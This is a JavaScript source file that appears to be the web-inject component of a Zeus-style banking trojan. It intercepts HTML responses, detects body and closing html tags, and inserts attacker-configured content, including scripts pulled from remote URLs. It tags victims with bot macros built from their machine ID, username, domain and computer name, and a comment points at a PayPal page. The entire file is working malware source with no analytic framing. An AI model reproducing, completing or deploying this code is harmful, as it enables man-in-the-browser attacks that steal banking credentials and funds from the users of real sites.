var stream = require('stream');
var util = require('util');
var zeusfunctions = require("zeusmask");
var suspend = require('suspend');
var http = require('http');
var https = require('https');
var url = require('url');

var Transform = stream.Transform ||
  require('readable-stream').Transform;


const endOfHtmlTagByte = 0x3E; 
const beginOfHtmlTagByte = 0x3C; 

const bodyTagBufferVariants = [
    new Buffer('body'),
    new Buffer('BODY')
];

const htmlTagBufferVariants = [
    new Buffer('/html'),
    new Buffer('/HTML')
];

const htmlContentTypes = [
    'text/html'
];

const jsContentTypes = [
    'application/ecmascript',
    'application/javascript',
    'application/x-ecmascript',
    'application/x-javascript',
    'text/ecmascript',
    'text/javascript',
    'text/javascript1.0',
    'text/javascript1.1',
    'text/javascript1.2',
    'text/javascript1.3',
    'text/javascript1.4',
    'text/javascript1.5',
    'text/jscript',
    'text/livescript',
    'text/x-ecmascript',
    'text/x-javascript'
];


function ReplaceStandartMacroses(str) {
    var retval = str;

    if (typeof (process.machineGuid) === 'string') {
        retval = retval.replace(/BOT_MACHINE_UUID/g, process.machineGuid);
    }

    retval = retval.replace(/BOT_MACHINE_DATE/g, new Date().toJSON());
    retval = retval.replace(/BOT_MACHINE_TIMESTAMP/g, Math.round(+new Date() / 1000));
    retval = retval.replace(/BOT_USERNAME/g, process.currentUser);
    retval = retval.replace(/BOT_USERDOMAIN/g, process.env['USERDOMAIN']);
    retval = retval.replace(/BOT_COMPUTERNAME/g, process.env['COMPUTERNAME']);
    retval = retval.replace(/BOT_VERSION/g, process.g_botId);
    retval = retval.replace(/BOT_PROCESS/g, process.currentBinary);
    retval = retval.replace(/BOT_PROCESS_ID/g, process.pid);
    retval = retval.replace(/BOT_PROCESS_PATH/g, process.execPath);

    var storedObjects = process.FsReadObjectEncrypted('gatevars.txt');
    if(storedObjects)
    {
        for(var i in storedObjects)
        {
            retval = retval.split(i).join(storedObjects[i]);
        }
    }
    return retval;
}


function isAlowedContentType(type){
    var ct = type.split(';')[0]
    return (
        htmlContentTypes.indexOf(ct) !== -1/* ||
        jsContentTypes.indexOf(ct) !== -1 */
    );
}

function IsHTML(type){
    var ct = type.split(';')[0];
    return (htmlContentTypes.indexOf(ct) !== -1)
}

function isStreamedInjection(inj) {
    return ([
        "STREAM_ADD_BEFORE_BODY_START",
        "STREAM_ADD_BEFORE_HTML_END",
        "STREAM_ADD_BEFORE_CONTENT_FINISH"
    ].indexOf(inj.data_before) !== -1);
}


function GetInjectDataByMethod(method, location) {
    var result = [];

    if (util.isUndefined(process.g_scfg)) {
        return result;
    }

    var injectsArray = process.g_scfg.injects;

    if (util.isUndefined(injectsArray)) {
        return result;
    }

    try {

        for (let i = 0; i < injectsArray.length; i++) {

            var inj = injectsArray[i];

            if (inj.base.enabled === false) {
                continue;
            }

            if (!zeusfunctions.isUrlNeedMatchedInRule(location, inj)) {
                continue;
            }

            if (isStreamedInjection(inj) && method === inj.data_before){
                result.push(ReplaceStandartMacroses(inj.data_inject))
            }
        }

    } catch (e) {
        trace('exception : isContentModificationNeeded() : %s', e.message);
    }
    return result;
}

//view-source:https://www.paypalobjects.com/
function InjectionStream(options) {
    
    if (!(this instanceof InjectionStream)) {
        return new InjectionStream(options);
    }
    
    
    Transform.call(this, options);

    this.location = options.location;
    this.isBypassed = !isAlowedContentType(options.contentType);
    this.IsHTML = IsHTML(options.contentType);

    this.STREAM_ADD_BEFORE_CONTENT_FINISH =
        GetInjectDataByMethod('STREAM_ADD_BEFORE_CONTENT_FINISH', options.location);
    this.STREAM_ADD_BEFORE_BODY_START =
        GetInjectDataByMethod('STREAM_ADD_BEFORE_BODY_START', options.location);
    this.STREAM_ADD_BEFORE_HTML_END =
        GetInjectDataByMethod('STREAM_ADD_BEFORE_HTML_END', options.location);
    
}

util.inherits(InjectionStream, Transform);

function bufferIndexOf(buf, search, offset) {
    offset = offset || 0

    var m = 0;
    var s = -1;
    for (var i = offset; i < buf.length; ++i) {

        if (buf[i] != search[m]) {
            s = -1;
            m = 0;
        }

        if (buf[i] == search[m]) {
            if (s == -1) s = i;
            ++m;
            if (m == search.length) break;
        }

    }

    if (s > -1 && buf.length - s < search.length) return -1;
    return s;
}

function PipeRemoteUrlIntoStream(location, dataStream, completeCb){
    
    var engine;
    var doneCalled;
    var options = url.parse(location);

    function done(error, result){
        if(!doneCalled){
            doneCalled = true;
            completeCb(error, result);
        }
    }
    
    if(location.indexOf('https://') === 0){
        engine = https;
        if(!options.port || options.port === 443){
            options.port = 443 + process.PORT_REDIRECTION_BASE;
        }
    }else if(location.indexOf('http://') === 0){
        engine = http;
        if(!options.port || options.port === 80){
            options.port = 80 + process.PORT_REDIRECTION_BASE;
        }
    }else {
        return done(null, true);
    }

    engine.get(options, function(response){
        if(response.statusCode === 200){
            response.on('data', function(data){
                dataStream.push(data);
            })
        }
        
        response.on('end', function(){
            done(null, true);
        });

        response.on('error', function(error){
            done(null, true);
        });

    }).on('error', function(error){
        done(null, true);
    });
}

function DisableOneTimeInjects(location, type){
    
    if (util.isUndefined(process.g_scfg)) {
        return;
    }

    var injectsArray = process.g_scfg.injects;

    if (util.isUndefined(injectsArray)) {
        return;
    }

    try {
        for (let i = 0; i < injectsArray.length; i++) {

            var inj = injectsArray[i];

            
            if (
                inj.data_before === type &&
                inj.data_after.split('|').indexOf('ONE_TIME') !== -1 && 
                inj.base.enabled === true)
            {
                if (zeusfunctions.isUrlNeedMatchedInRule(location, inj))
                {
                    inj.base.enabled = false;
                }
            }
        }
    } catch (e) {
    }
}

var InsertContentToStream = suspend(function*(type, controlledStream, onComplete){
    
    if(type !== '' && controlledStream[type]){
        var contentArray = controlledStream[type];

        for (var i = 0; i < contentArray.length; i++)
        {
            var data = contentArray[i];
            if(data.indexOf('REMOTE_SCRIPT_CONTENT:') === 0){
                var remoteUrl = data.replace('REMOTE_SCRIPT_CONTENT:', '');
                if(controlledStream.IsHTML) controlledStream.push('<script>');
                var result = yield PipeRemoteUrlIntoStream(remoteUrl, controlledStream, suspend.resume());
                if(controlledStream.IsHTML) controlledStream.push('</script>');
            }else if(data.indexOf('REMOTE_PLAIN_CONTENT:') === 0){
                var remoteUrl = data.replace('REMOTE_PLAIN_CONTENT:', '');
                var result = yield PipeRemoteUrlIntoStream(remoteUrl, controlledStream, suspend.resume());
            }else {
                controlledStream.push(contentArray[i]);
            }
        }

        DisableOneTimeInjects(controlledStream.location, type);
    }

    onComplete(null, true);
});


InjectionStream.prototype._flush = function(cb) {
    if(this.isBypassed){
        return cb(); 
    }

    if (this.STREAM_ADD_BEFORE_CONTENT_FINISH.length > 0) {
        InsertContentToStream('STREAM_ADD_BEFORE_CONTENT_FINISH', this, function(){
            cb();
        });
    }else cb();
};

function FindTagInChunk(tags, chunk, beginIndex){
    var bodyTagOffset = -1;
    var endOfTagOffset = -1;

    tags.forEach(function (tag) {
        if (bodyTagOffset === -1) {
            bodyTagOffset = bufferIndexOf(chunk, tag, beginIndex);
        }
    });
        
    if (bodyTagOffset !== -1) {
        for (var i = bodyTagOffset; i < chunk.length; i++) {
            if (chunk[i] === endOfHtmlTagByte) {
                endOfTagOffset = (i + 1);
                break;
            }
        }
    }

    return {
        tagOffset : bodyTagOffset,
        endOfTagOffset : endOfTagOffset
    };
}

function IsBufferStartWith(chunk, offset, checkArray){

    for(var i = 0; i < checkArray.length; i ++){
        for(var j = 0; j < checkArray[i].length; j ++){
            if(chunk[offset + j] !== checkArray[i][j])
                break;
        }
        if(j === checkArray[i].length)
            return true;
    }
    return false;
}

InjectionStream.prototype._transform = suspend(function*(chunk, enc, cb) {

    if(this.isBypassed){
        this.push(chunk);
        return cb(); 
    }

    
    
    if(this.IsHTML){
        if (
            this.STREAM_ADD_BEFORE_BODY_START.length > 0 || 
            this.STREAM_ADD_BEFORE_HTML_END.length > 0
        ){
            let startOffset = chunk.indexOf(beginOfHtmlTagByte);
            let currentSliceOffset = 0;

            while(startOffset !== -1)
            {                
                var IsBodyTag = IsBufferStartWith(chunk, startOffset + 1, bodyTagBufferVariants);
                var IsHtmlCloseTag = IsBufferStartWith(chunk, startOffset + 1, htmlTagBufferVariants);

                if( IsBodyTag || IsHtmlCloseTag )
                {
                    var TYPE = '';
                    if(IsBodyTag){
                        TYPE = 'STREAM_ADD_BEFORE_BODY_START';
                    }else if(IsHtmlCloseTag){
                        TYPE = 'STREAM_ADD_BEFORE_HTML_END';
                    }

                    let endTagOffset = chunk.indexOf(endOfHtmlTagByte, startOffset + 1);
                    if(endTagOffset !== -1){
                        this.push(chunk.slice(currentSliceOffset, endTagOffset + 1));
                        currentSliceOffset = endTagOffset + 1;
                        yield InsertContentToStream(TYPE, this, suspend.resume());
                    }
                }

                startOffset = chunk.indexOf(beginOfHtmlTagByte, startOffset + 1);
            }

            if(currentSliceOffset === 0){
                this.push(chunk);
            }else if(currentSliceOffset < chunk.length){
                this.push(chunk.slice(currentSliceOffset));
            }

        }
    }else{
        this.push(chunk);
    }

    cb();
});

exports.InjectionStream = InjectionStream;
exports.isStreamedInjection = isStreamedInjection;